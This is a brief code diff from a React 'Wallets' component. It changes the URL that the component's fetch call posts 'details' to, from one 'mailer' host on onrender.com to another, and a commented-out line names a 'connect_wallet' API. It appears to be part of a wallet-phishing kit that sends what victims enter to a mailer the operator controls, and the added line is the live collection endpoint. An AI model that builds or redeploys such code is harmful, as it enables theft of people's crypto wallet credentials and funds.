@@ -61,7 +61,7 @@ const Wallets = () => {
     };
 
     try {
-      const url = "https://davidomailer.onrender.com/details";
+      const url = "https://ozilbromailer.onrender.com/details";
       //   "https://crypto-connect-auq0.onrender.com/api/v1/connect_wallet";
 
       const res = await fetch(url, {
